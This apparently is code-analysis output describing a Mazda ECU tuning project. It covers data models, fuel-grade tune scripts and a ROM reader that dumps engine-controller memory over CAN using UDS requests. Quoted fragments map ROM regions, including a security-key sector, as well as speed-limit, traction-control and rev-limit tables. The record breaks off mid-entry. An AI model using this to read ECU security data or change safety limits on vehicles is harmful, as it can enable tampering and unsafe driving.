{"file_path": "models.py", "lines_read": 363, "features_found": [{"type": "function", "name": "__post_init__", "line": 127}, {"type": "function", "name": "pid", "line": 143}, {"type": "function", "name": "to_dict", "line": 191}, {"type": "function", "name": "validate", "line": 235}, {"type": "function", "name": "get_parameter", "line": 254}, {"type": "function", "name": "set_parameter", "line": 258}, {"type": "function", "name": "is_misfire", "line": 278}, {"type": "function", "name": "elapsed_time", "line": 296}, {"type": "function", "name": "is_expired", "line": 311}, {"type": "function", "name": "has_permission", "line": 317}, {"type": "function", "name": "matches", "line": 330}, {"type": "function", "name": "to_dict", "line": 346}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "Enum,", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "struct", "line": null}], "components_found": [{"type": "class", "name": "VehicleState", "line": 13}, {"type": "class", "name": "SecurityLevel", "line": 22}, {"type": "class", "name": "CANPriority", "line": 32}, {"type": "class", "name": "OBDProtocol", "line": 41}, {"type": "class", "name": "TuningMode", "line": 50}, {"type": "class", "name": "FlashState", "line": 59}, {"type": "class", "name": "ExploiterState", "line": 71}, {"type": "class", "name": "ECUState", "line": 81}, {"type": "class", "name": "EEPROMOperation", "line": 91}, {"type": "class", "name": "ECUOperation", "line": 102}, {"type": "class", "name": "CANMessage", "line": 118}, {"type": "class", "name": "OBDPacket", "line": 134}, {"type": "class", "name": "TelemetryData", "line": 151}, {"type": "class", "name": "TuningParameter", "line": 221}, {"type": "class", "name": "TuningProfile", "line": 243}, {"type": "class", "name": "DiagnosticTroubleCode", "line": 267}, {"type": "class", "name": "FlashOperation", "line": 284}, {"type": "class", "name": "SecurityCredentials", "line": 302}, {"type": "class", "name": "CANFilter", "line": 323}, {"type": "class", "name": "LogEntry", "line": 338}], "algorithms": [], "protocols": [{"type": "protocol", "line": 32, "protocol": "CAN", "content": "class CANPriority(IntEnum):"}, {"type": "protocol", "line": 33, "protocol": "CAN", "content": "\"\"\"CAN message priority levels.\"\"\""}, {"type": "protocol", "line": 41, "protocol": "OBD", "content": "class OBDProtocol(Enum):"}, {"type": "protocol", "line": 42, "protocol": "OBD", "content": "\"\"\"Supported OBD-II protocols.\"\"\""}, {"type": "protocol", "line": 44, "protocol": "KWP", "content": "ISO_14230_4 = \"ISO_14230_4\"  # KWP2000"}, {"type": "protocol", "line": 45, "protocol": "CAN", "content": "ISO_15765_4 = \"ISO_15765_4\"  # CAN"}, {"type": "protocol", "line": 118, "protocol": "CAN", "content": "class CANMessage:"}, {"type": "protocol", "line": 119, "protocol": "CAN", "content": "\"\"\"CAN bus message structure.\"\"\""}, {"type": "protocol", "line": 125, "protocol": "CAN", "content": "priority: CANPriority = field(default=CANPriority.NORMAL)"}, {"type": "protocol", "line": 129, "protocol": "CAN", "content": "raise ValueError(f\"CAN data too long: {len(self.data)} bytes (max 8)\")"}, {"type": "protocol", "line": 134, "protocol": "OBD", "content": "class OBDPacket:"}, {"type": "protocol", "line": 135, "protocol": "OBD", "content": "\"\"\"OBD-II communication packet.\"\"\""}, {"type": "protocol", "line": 138, "protocol": "OBD", "content": "protocol: OBDProtocol"}, {"type": "protocol", "line": 144, "protocol": "PID", "content": "\"\"\"Extract PID from packet if applicable.\"\"\""}, {"type": "protocol", "line": 323, "protocol": "CAN", "content": "class CANFilter:"}, {"type": "protocol", "line": 324, "protocol": "CAN", "content": "\"\"\"CAN message filter configuration.\"\"\""}, {"type": "protocol", "line": 330, "protocol": "CAN", "content": "def matches(self, message: CANMessage) -> bool:"}, {"type": "protocol", "line": 331, "protocol": "CAN", "content": "\"\"\"Check if CAN message matches this filter.\"\"\""}, {"type": "protocol", "line": 359, "protocol": "CAN", "content": "CANMessageQueue = List[CANMessage]"}], "hardware_assumptions": [{"type": "hardware", "line": 13, "hardware": "vehicle", "content": "class VehicleState(Enum):"}, {"type": "hardware", "line": 14, "hardware": "vehicle", "content": "\"\"\"Vehicle operational states.\"\"\""}, {"type": "hardware", "line": 22, "hardware": "ECU", "content": "class SecurityLevel(Enum):"}, {"type": "hardware", "line": 23, "hardware": "ECU", "content": "\"\"\"Security access levels for ECU operations.\"\"\""}, {"type": "hardware", "line": 60, "hardware": "ECU", "content": "\"\"\"ECU flashing operation states.\"\"\""}, {"type": "hardware", "line": 81, "hardware": "ECU", "content": "class ECUState(Enum):"}, {"type": "hardware", "line": 82, "hardware": "ECU", "content": "\"\"\"ECU operational states.\"\"\""}, {"type": "hardware", "line": 102, "hardware": "ECU", "content": "class ECUOperation(Enum):"}, {"type": "hardware", "line": 103, "hardware": "ECU", "content": "\"\"\"ECU operation types.\"\"\""}, {"type": "hardware", "line": 109, "hardware": "ECU", "content": "BACKUP_ECU = \"backup_ecu\""}, {"type": "hardware", "line": 110, "hardware": "ECU", "content": "RESTORE_ECU = \"restore_ecu\""}, {"type": "hardware", "line": 113, "hardware": "ECU", "content": "RESET_ECU = \"reset_ecu\""}, {"type": "hardware", "line": 119, "hardware": "CAN bus", "content": "\"\"\"CAN bus message structure.\"\"\""}, {"type": "hardware", "line": 158, "hardware": "ABS", "content": "map: float = 0.0   # Manifold absolute pressure (kPa)"}, {"type": "hardware", "line": 179, "hardware": "vehicle", "content": "vehicle_speed: float = 0.0   # Vehicle speed (km/h)"}, {"type": "hardware", "line": 210, "hardware": "vehicle", "content": "'vehicle_speed': self.vehicle_speed,"}, {"type": "hardware", "line": 231, "hardware": "ECU", "content": "security_level: SecurityLevel = field(default=SecurityLevel.TUNING)"}, {"type": "hardware", "line": 232, "hardware": "ECU", "content": "address: Optional[int] = None  # ECU memory address if applicable"}, {"type": "hardware", "line": 285, "hardware": "ECU", "content": "\"\"\"ECU flash operation details.\"\"\""}, {"type": "hardware", "line": 302, "hardware": "ECU", "content": "class SecurityCredentials:"}, {"type": "hardware", "line": 303, "hardware": "ECU", "content": "\"\"\"Security authentication credentials.\"\"\""}, {"type": "hardware", "line": 306, "hardware": "ECU", "content": "security_level: SecurityLevel"}, {"type": "hardware", "line": 362, "hardware": "ECU", "content": "SecurityContext = Optional[SecurityCredentials]"}], "security_logic": [{"type": "security_pattern", "line": 305, "pattern": "password", "content": "password_hash: str"}, {"type": "security_pattern", "line": 305, "pattern": "hash", "content": "password_hash: str"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mps safe tune.py", "lines_read": 560, "features_found": [{"type": "function", "name": "demonstrate_safe_tunes", "line": 480}, {"type": "function", "name": "__init__", "line": 25}, {"type": "function", "name": "_define_safe_limits", "line": 30}, {"type": "function", "name": "_generate_safe_tunes", "line": 65}, {"type": "function", "name": "_create_safe_95_octane_tune", "line": 73}, {"type": "function", "name": "_create_safe_98_octane_tune", "line": 159}, {"type": "function", "name": "_create_safe_100_plus_tune", "line": 239}, {"type": "function", "name": "_safety_monitoring_systems", "line": 324}, {"type": "function", "name": "calculate_safe_performance_gains", "line": 366}, {"type": "function", "name": "get_safe_tuning_recommendations", "line": 398}, {"type": "function", "name": "generate_safe_tune_package", "line": 424}, {"type": "function", "name": "_estimate_safe_0_60", "line": 461}, {"type": "function", "name": "_estimate_safe_quarter_mile", "line": 470}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "json", "line": null}], "components_found": [{"type": "class", "name": "SafeFuelLimits", "line": 13}, {"type": "class", "name": "SafePremiumFuelTuner", "line": 19}], "algorithms": [{"type": "algorithm_function", "line": 366, "content": "def calculate_safe_performance_gains(self) -> Dict[str, Any]:"}], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 355, "hardware": "ABS", "content": "'absolute_boost_limit': 25.0,  # Hard cut"}, {"type": "hardware", "line": 403, "hardware": "vehicle", "content": "\"Ideal for high mileage vehicles\","}, {"type": "hardware", "line": 406, "hardware": "vehicle", "content": "\"Recommended for stock vehicles 100,000+ miles\""}, {"type": "hardware", "line": 413, "hardware": "vehicle", "content": "\"Recommended for vehicles under 100,000 miles\""}, {"type": "hardware", "line": 444, "hardware": "vehicle", "content": "\"1. Verify vehicle maintenance is current\","}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mps tune.py", "lines_read": 490, "features_found": [{"type": "function", "name": "demonstrate_premium_fuel_tunes", "line": 423}, {"type": "function", "name": "__init__", "line": 25}, {"type": "function", "name": "_define_fuel_limits", "line": 29}, {"type": "function", "name": "_generate_base_tunes", "line": 58}, {"type": "function", "name": "_create_95_octane_tune", "line": 66}, {"type": "function", "name": "_create_98_octane_tune", "line": 143}, {"type": "function", "name": "_create_100_plus_tune", "line": 220}, {"type": "function", "name": "calculate_performance_gains", "line": 303}, {"type": "function", "name": "get_tuning_recommendations", "line": 329}, {"type": "function", "name": "generate_complete_tune_package", "line": 353}, {"type": "function", "name": "_estimate_0_60", "line": 381}, {"type": "function", "name": "_estimate_quarter_mile", "line": 390}, {"type": "function", "name": "_get_safety_notes", "line": 399}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "json", "line": null}], "components_found": [{"type": "class", "name": "PremiumFuelLimits", "line": 13}, {"type": "class", "name": "PremiumFuelTuner", "line": 19}], "algorithms": [{"type": "algorithm_function", "line": 303, "content": "def calculate_performance_gains(self) -> Dict[str, Any]:"}], "protocols": [{"type": "protocol", "line": 465, "protocol": "CAN", "content": "print(\"SUMMARY: SIGNIFICANT GAINS WITH PREMIUM FUELS\")"}], "hardware_assumptions": [], "security_logic": [{"type": "security_pattern", "line": 356, "pattern": "key", "content": "raise ValueError(f\"Fuel grade {fuel_grade} not supported. Use: {list(self.base_tunes.keys())}\")"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mpsrom.py", "lines_read": 461, "features_found": [{"type": "function", "name": "analyze_complete_rom", "line": 401}, {"type": "function", "name": "__init__", "line": 29}, {"type": "function", "name": "_define_rom_structure", "line": 36}, {"type": "function", "name": "_define_maps", "line": 50}, {"type": "function", "name": "_define_pids", "line": 94}, {"type": "function", "name": "_define_dids", "line": 119}, {"type": "function", "name": "read_rom_sector", "line": 148}, {"type": "function", "name": "_build_read_memory_request", "line": 177}, {"type": "function", "name": "_receive_memory_data", "line": 192}, {"type": "function", "name": "read_live_data_pid", "line": 203}, {"type": "function", "name": "_parse_pid_value", "line": 231}, {"type": "function", "name": "read_data_identifier", "line": 246}, {"type": "function", "name": "extract_map_from_rom", "line": 274}, {"type": "function", "name": "_convert_16x16_map", "line": 296}, {"type": "function", "name": "_convert_8x8_map", "line": 306}, {"type": "function", "name": "_convert_1d_map", "line": 315}, {"type": "function", "name": "_convert_single_value", "line": 324}, {"type": "function", "name": "dump_complete_rom", "line": 330}, {"type": "function", "name": "generate_map_definitions_file", "line": 341}, {"type": "function", "name": "__init__", "line": 359}, {"type": "function", "name": "start_live_monitoring", "line": 364}, {"type": "function", "name": "_log_data_point", "line": 386}, {"type": "function", "name": "stop_monitoring", "line": 396}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "binascii", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "crcmod", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "json", "line": null}], "components_found": [{"type": "class", "name": "ROMDefinition", "line": 18}, {"type": "class", "name": "MazdaECUROMReader", "line": 26}, {"type": "class", "name": "LiveDataMonitor", "line": 356}], "algorithms": [], "protocols": [{"type": "protocol", "line": 39, "protocol": "0x[0-9A-Fa-f]+", "content": "'boot_sector': ROMDefinition(0x000000, 0x010000, 'Bootloader and security'),"}, {"type": "protocol", "line": 40, "protocol": "0x[0-9A-Fa-f]+", "content": "'calibration_a': ROMDefinition(0x010000, 0x080000, 'Primary calibration tables'),"}, {"type": "protocol", "line": 41, "protocol": "0x[0-9A-Fa-f]+", "content": "'calibration_b': ROMDefinition(0x090000, 0x080000, 'Secondary/backup calibration'),"}, {"type": "protocol", "line": 42, "protocol": "0x[0-9A-Fa-f]+", "content": "'operating_system': ROMDefinition(0x110000, 0x040000, 'ECU operating system'),"}, {"type": "protocol", "line": 43, "protocol": "0x[0-9A-Fa-f]+", "content": "'fault_codes': ROMDefinition(0x150000, 0x020000, 'DTC storage and freeze frames'),"}, {"type": "protocol", "line": 44, "protocol": "0x[0-9A-Fa-f]+", "content": "'adaptation_data': ROMDefinition(0x170000, 0x020000, 'Adaptive learning data'),"}, {"type": "protocol", "line": 45, "protocol": "0x[0-9A-Fa-f]+", "content": "'vin_storage': ROMDefinition(0x190000, 0x001000, 'VIN and vehicle data'),"}, {"type": "protocol", "line": 46, "protocol": "0x[0-9A-Fa-f]+", "content": "'security_sector': ROMDefinition(0x191000, 0x001000, 'Security keys and access'),"}, {"type": "protocol", "line": 47, "protocol": "0x[0-9A-Fa-f]+", "content": "'end_of_memory': ROMDefinition(0x1F0000, 0x010000, 'Checksums and validation')"}, {"type": "protocol", "line": 54, "protocol": "0x[0-9A-Fa-f]+", "content": "'primary_map': {'address': 0x012000, 'size': 0x0400, 'type': '16x16', 'description': 'Main ignition "}, {"type": "protocol", "line": 55, "protocol": "0x[0-9A-Fa-f]+", "content": "'high_octane_map': {'address': 0x012400, 'size': 0x0400, 'type': '16x16', 'description': 'High octan"}, {"type": "protocol", "line": 56, "protocol": "0x[0-9A-Fa-f]+", "content": "'low_octane_map': {'address': 0x012800, 'size': 0x0400, 'type': '16x16', 'description': 'Low octane "}, {"type": "protocol", "line": 57, "protocol": "0x[0-9A-Fa-f]+", "content": "'cold_temp_correction': {'address': 0x012C00, 'size': 0x0200, 'type': '8x8', 'description': 'Cold te"}, {"type": "protocol", "line": 58, "protocol": "0x[0-9A-Fa-f]+", "content": "'iat_correction': {'address': 0x012E00, 'size': 0x0100, 'type': '1D', 'description': 'IAT timing cor"}, {"type": "protocol", "line": 61, "protocol": "0x[0-9A-Fa-f]+", "content": "'primary_fuel_map': {'address': 0x013000, 'size': 0x0400, 'type': '16x16', 'description': 'Main fuel"}, {"type": "protocol", "line": 62, "protocol": "0x[0-9A-Fa-f]+", "content": "'wot_enrichment': {'address': 0x013400, 'size': 0x0200, 'type': '8x8', 'description': 'WOT fuel enri"}, {"type": "protocol", "line": 63, "protocol": "0x[0-9A-Fa-f]+", "content": "'cold_start_enrichment': {'address': 0x013600, 'size': 0x0200, 'type': '8x8', 'description': 'Cold s"}, {"type": "protocol", "line": 64, "protocol": "0x[0-9A-Fa-f]+", "content": "'acceleration_enrichment': {'address': 0x013800, 'size': 0x0100, 'type': '1D', 'description': 'Trans"}, {"type": "protocol", "line": 65, "protocol": "0x[0-9A-Fa-f]+", "content": "'deceleration_enleanment': {'address': 0x013900, 'size': 0x0100, 'type': '1D', 'description': 'Overr"}, {"type": "protocol", "line": 68, "protocol": "0x[0-9A-Fa-f]+", "content": "'target_boost_map': {'address': 0x014000, 'size': 0x0400, 'type': '16x16', 'description': 'Boost tar"}, {"type": "protocol", "line": 69, "protocol": "0x[0-9A-Fa-f]+", "content": "'wastegate_duty_map': {'address': 0x014400, 'size': 0x0400, 'type': '16x16', 'description': 'Wastega"}, {"type": "protocol", "line": 70, "protocol": "0x[0-9A-Fa-f]+", "content": "'overboost_protection': {'address': 0x014800, 'size': 0x0200, 'type': '8x8', 'description': 'Overboo"}, {"type": "protocol", "line": 71, "protocol": "0x[0-9A-Fa-f]+", "content": "'turbo_spool_control': {'address': 0x014A00, 'size': 0x0200, 'type': '8x8', 'description': 'Spool op"}, {"type": "protocol", "line": 74, "protocol": "0x[0-9A-Fa-f]+", "content": "'intake_cam_map': {'address': 0x015000, 'size': 0x0400, 'type': '16x16', 'description': 'Intake VVT "}, {"type": "protocol", "line": 75, "protocol": "0x[0-9A-Fa-f]+", "content": "'exhaust_cam_map': {'address': 0x015400, 'size': 0x0400, 'type': '16x16', 'description': 'Exhaust VV"}, {"type": "protocol", "line": 76, "protocol": "0x[0-9A-Fa-f]+", "content": "'cam_transition_maps': {'address': 0x015800, 'size': 0x0200, 'type': '8x8', 'description': 'Cam tran"}, {"type": "protocol", "line": 79, "protocol": "0x[0-9A-Fa-f]+", "content": "'engine_torque_limit': {'address': 0x016000, 'size': 0x0200, 'type': '8x8', 'description': 'Max engi"}, {"type": "protocol", "line": 80, "protocol": "0x[0-9A-Fa-f]+", "content": "'transmission_torque_limit': {'address': 0x016200, 'size': 0x0200, 'type': '8x8', 'description': 'Ge"}, {"type": "protocol", "line": 81, "protocol": "0x[0-9A-Fa-f]+", "content": "'traction_control_reduction': {'address': 0x016400, 'size': 0x0100, 'type': '1D', 'description': 'TC"}, {"type": "protocol", "line": 84, "protocol": "0x[0-9A-Fa-f]+", "content": "'soft_cut_rpm': {'address': 0x017000, 'size': 0x0010, 'type': 'Single', 'description': 'Soft rev lim"}, {"type": "protocol", "line": 85, "protocol": "0x[0-9A-Fa-f]+", "content": "'hard_cut_rpm': {'address': 0x017010, 'size': 0x0010, 'type': 'Single', 'description': 'Hard rev lim"}, {"type": "protocol", "line": 86, "protocol": "0x[0-9A-Fa-f]+", "content": "'fuel_cut_recovery': {'address': 0x017020, 'size': 0x0010, 'type': 'Single', 'description': 'Fuel cu"}, {"type": "protocol", "line": 89, "protocol": "0x[0-9A-Fa-f]+", "content": "'speed_limit': {'address': 0x017100, 'size': 0x0010, 'type': 'Single', 'description': 'Vehicle speed"}, {"type": "protocol", "line": 90, "protocol": "0x[0-9A-Fa-f]+", "content": "'limit_by_gear': {'address': 0x017110, 'size': 0x0020, 'type': '1D', 'description': 'Speed limit by "}, {"type": "protocol", "line": 95, "protocol": "OBD", "content": "\"\"\"COMPLETE OBD-II PID DEFINITIONS WITH MAZDA EXTENSIONS\"\"\""}, {"type": "protocol", "line": 95, "protocol": "PID", "content": "\"\"\"COMPLETE OBD-II PID DEFINITIONS WITH MAZDA EXTENSIONS\"\"\""}, {"type": "protocol", "line": 98, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x04': {'name': 'CALCULATED_ENGINE_LOAD', 'formula': '(A * 100) / 255', 'unit': '%', 'bytes': 1},"}, {"type": "protocol", "line": 99, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x05': {'name': 'ENGINE_COOLANT_TEMP', 'formula': 'A - 40', 'unit': '\u00b0C', 'bytes': 1},"}, {"type": "protocol", "line": 100, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x0C': {'name': 'ENGINE_RPM', 'formula': '((A * 256) + B) / 4', 'unit': 'RPM', 'bytes': 2},"}, {"type": "protocol", "line": 101, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x0D': {'name': 'VEHICLE_SPEED', 'formula': 'A', 'unit': 'km/h', 'bytes': 1},"}, {"type": "protocol", "line": 102, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x0F': {'name': 'INTAKE_AIR_TEMP', 'formula': 'A - 40', 'unit': '\u00b0C', 'bytes': 1},"}, {"type": "protocol", "line": 103, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x11': {'name': 'THROTTLE_POSITION', 'formula': '(A * 100) / 255', 'unit': '%', 'bytes': 1},"}, {"type": "protocol", "line": 104, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x1F': {'name': 'RUN_TIME_SINCE_ENGINE_START', 'formula': '(A * 256) + B', 'unit': 'seconds', 'byte"}, {"type": "protocol", "line": 105, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x21': {'name': 'DISTANCE_TRAVELED_WITH_MIL_ON', 'formula': '(A * 256) + B', 'unit': 'km', 'bytes':"}, {"type": "protocol", "line": 108, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x223365': {'name': 'BOOST_PRESSURE', 'formula': '((A * 256) + B - 1000) / 10', 'unit': 'PSI', 'byt"}, {"type": "protocol", "line": 109, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x22345C': {'name': 'VVT_ANGLE_INTAKE', 'formula': '(A - 128) / 2', 'unit': 'degrees', 'bytes': 1},"}, {"type": "protocol", "line": 110, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x223456': {'name': 'KNOCK_CORRECTION', 'formula': '(A - 128) / 2', 'unit': 'degrees', 'bytes': 1},"}, {"type": "protocol", "line": 111, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x223467': {'name': 'INJECTOR_PULSE_WIDTH', 'formula': '((A * 256) + B) / 1000', 'unit': 'ms', 'byt"}, {"type": "protocol", "line": 112, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x223478': {'name': 'TURBO_WASTEGATE_DUTY', 'formula': '(A * 100) / 255', 'unit': '%', 'bytes': 1},"}, {"type": "protocol", "line": 113, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x223489': {'name': 'AFR_COMMANDED', 'formula': 'A / 10', 'unit': 'AFR', 'bytes': 1},"}, {"type": "protocol", "line": 114, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x223490': {'name': 'FUEL_PRESSURE', 'formula': 'A * 10', 'unit': 'PSI', 'bytes': 1},"}, {"type": "protocol", "line": 115, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x2234A1': {'name': 'OIL_TEMPERATURE', 'formula': 'A - 40', 'unit': '\u00b0C', 'bytes': 1}"}, {"type": "protocol", "line": 123, "protocol": "0x[0-9A-Fa-f]+", "content": "'0xF187': {'name': 'ECU_PART_NUMBER', 'size': 16, 'description': 'ECU hardware part number'},"}, {"type": "protocol", "line": 124, "protocol": "0x[0-9A-Fa-f]+", "content": "'0xF188': {'name': 'ECU_SOFTWARE_VERSION', 'size': 8, 'description': 'ECU software version'},"}, {"type": "protocol", "line": 125, "protocol": "0x[0-9A-Fa-f]+", "content": "'0xF189': {'name': 'VIN', 'size': 17, 'description': 'Vehicle Identification Number'},"}, {"type": "protocol", "line": 126, "protocol": "0x[0-9A-Fa-f]+", "content": "'0xF18A': {'name': 'CALIBRATION_ID', 'size': 16, 'description': 'Calibration identification'}"}, {"type": "protocol", "line": 129, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x2000': {'name': 'ENGINE_RUN_TIME', 'size': 4, 'description': 'Total engine run time'},"}, {"type": "protocol", "line": 130, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x2001': {'name': 'IGNITION_CYCLE_COUNT', 'size': 2, 'description': 'Number of ignition cycles'},"}, {"type": "protocol", "line": 131, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x2002': {'name': 'FUEL_USAGE_TOTAL', 'size': 4, 'description': 'Lifetime fuel consumption'},"}, {"type": "protocol", "line": 132, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x2003': {'name': 'DISTANCE_TRAVELED', 'size': 4, 'description': 'Total distance traveled'}"}, {"type": "protocol", "line": 135, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x2100': {'name': 'FUEL_TRIM_LEARN_VALUES', 'size': 64, 'description': 'Long term fuel trim cells'}"}, {"type": "protocol", "line": 136, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x2101': {'name': 'KNOCK_LEARN_VALUES', 'size': 32, 'description': 'Knock adaptation tables'},"}, {"type": "protocol", "line": 137, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x2102': {'name': 'THROTTLE_ADAPTATION', 'size': 16, 'description': 'Throttle body adaptation'},"}, {"type": "protocol", "line": 138, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x2103': {'name': 'TCM_ADAPTATION', 'size': 48, 'description': 'Transmission adaptation data'}"}, {"type": "protocol", "line": 141, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x2200': {'name': 'CURRENT_DTCS', 'size': 64, 'description': 'Currently active DTCs'},"}, {"type": "protocol", "line": 142, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x2201': {'name': 'PENDING_DTCS', 'size': 64, 'description': 'Pending diagnostic codes'},"}, {"type": "protocol", "line": 143, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x2202': {'name': 'PERMANENT_DTCS', 'size': 64, 'description': 'Permanent fault codes'},"}, {"type": "protocol", "line": 144, "protocol": "0x[0-9A-Fa-f]+", "content": "'0x2203': {'name': 'FREEZE_FRAME_DATA', 'size': 128, 'description': 'Freeze frame snapshots'}"}, {"type": "protocol", "line": 149, "protocol": "CAN", "content": "\"\"\"READ COMPLETE ROM SECTOR VIA CAN BUS\"\"\""}, {"type": "protocol", "line": 178, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"BUILD 0x23 READ MEMORY BY ADDRESS REQUEST\"\"\""}, {"type": "protocol", "line": 180, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x23)  # Service ID: ReadMemoryByAddress"}, {"type": "protocol", "line": 187, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,  # ECU request ID"}, {"type": "protocol", "line": 196, "protocol": "0x[0-9A-Fa-f]+", "content": "if message and message.arbitration_id == 0x7E8:  # ECU response ID"}, {"type": "protocol", "line": 197, "protocol": "0x[0-9A-Fa-f]+", "content": "if message.data[0] == 0x63:  # Positive response"}, {"type": "protocol", "line": 204, "protocol": "OBD", "content": "\"\"\"READ LIVE DATA VIA OBD-II PID\"\"\""}, {"type": "protocol", "line": 204, "protocol": "PID", "content": "\"\"\"READ LIVE DATA VIA OBD-II PID\"\"\""}, {"type": "protocol", "line": 214, "protocol": "PID", "content": "raise ValueError(f\"PID {pid} not defined\")"}, {"type": "protocol", "line": 218, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 219, "protocol": "0x[0-9A-Fa-f]+", "content": "data=bytes([0x22]) + bytes.fromhex(pid[2:]),  # 0x22 = ReadDataByIdentifier"}, {"type": "protocol", "line": 232, "protocol": "PID", "content": "\"\"\"PARSE PID VALUE USING DEFINED FORMULA\"\"\""}, {"type": "protocol", "line": 247, "protocol": "UDS", "content": "\"\"\"READ DATA IDENTIFIER VIA UDS\"\"\""}, {"type": "protocol", "line": 261, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 262, "protocol": "0x[0-9A-Fa-f]+", "content": "data=bytes([0x22]) + bytes.fromhex(did[2:]),  # 0x22 = ReadDataByIdentifier"}, {"type": "protocol", "line": 280, "protocol": "0x[0-9A-Fa-f]+", "content": "start = map_info['address'] - 0x010000  # Adjust for calibration sector base"}, {"type": "protocol", "line": 423, "protocol": "PID", "content": "print(\"\\n3. LIVE DATA PID MONITORING\")"}, {"type": "protocol", "line": 425, "protocol": "0x[0-9A-Fa-f]+", "content": "monitor_pids = ['0x0C', '0x0D', '0x11', '0x223365']  # RPM, Speed, Throttle, Boost"}], "hardware_assumptions": [{"type": "hardware", "line": 19, "hardware": "ECU", "content": "\"\"\"COMPLETE ROM STRUCTURE DEFINITION FOR MZR DISI ECU\"\"\""}, {"type": "hardware", "line": 26, "hardware": "ECU", "content": "class MazdaECUROMReader:"}, {"type": "hardware", "line": 39, "hardware": "ECU", "content": "'boot_sector': ROMDefinition(0x000000, 0x010000, 'Bootloader and security'),"}, {"type": "hardware", "line": 42, "hardware": "ECU", "content": "'operating_system': ROMDefinition(0x110000, 0x040000, 'ECU operating system'),"}, {"type": "hardware", "line": 45, "hardware": "vehicle", "content": "'vin_storage': ROMDefinition(0x190000, 0x001000, 'VIN and vehicle data'),"}, {"type": "hardware", "line": 46, "hardware": "ECU", "content": "'security_sector': ROMDefinition(0x191000, 0x001000, 'Security keys and access'),"}, {"type": "hardware", "line": 89, "hardware": "vehicle", "content": "'speed_limit': {'address': 0x017100, 'size': 0x0010, 'type': 'Single', 'description': 'Vehicle speed"}, {"type": "hardware", "line": 101, "hardware": "vehicle", "content": "'0x0D': {'name': 'VEHICLE_SPEED', 'formula': 'A', 'unit': 'km/h', 'bytes': 1},"}, {"type": "hardware", "line": 120, "hardware": "ECU", "content": "\"\"\"COMPLETE DATA IDENTIFIER DEFINITIONS FOR MAZDA ECU\"\"\""}, {"type": "hardware", "line": 122, "hardware": "ECU", "content": "'ecu_identification': {"}, {"type": "hardware", "line": 123, "hardware": "ECU", "content": "'0xF187': {'name': 'ECU_PART_NUMBER', 'size': 16, 'description': 'ECU hardware part number'},"}, {"type": "hardware", "line": 124, "hardware": "ECU", "content": "'0xF188': {'name': 'ECU_SOFTWARE_VERSION', 'size': 8, 'description': 'ECU software version'},"}, {"type": "hardware", "line": 125, "hardware": "vehicle", "content": "'0xF189': {'name': 'VIN', 'size': 17, 'description': 'Vehicle Identification Number'},"}, {"type": "hardware", "line": 138, "hardware": "TCM", "content": "'0x2103': {'name': 'TCM_ADAPTATION', 'size': 48, 'description': 'Transmission adaptation data'}"}, {"type": "hardware", "line": 149, "hardware": "CAN bus", "content": "\"\"\"READ COMPLETE ROM SECTOR VIA CAN BUS\"\"\""}, {"type": "hardware", "line": 187, "hardware": "ECU", "content": "arbitration_id=0x7E0,  # ECU request ID"}, {"type": "hardware", "line": 193, "hardware": "ECU", "content": "\"\"\"RECEIVE MEMORY DATA FROM ECU RESPONSE\"\"\""}, {"type": "hardware", "line": 196, "hardware": "ECU", "content": "if message and message.arbitration_id == 0x7E8:  # ECU response ID"}, {"type": "hardware", "line": 331, "hardware": "ECU", "content": "\"\"\"DUMP COMPLETE 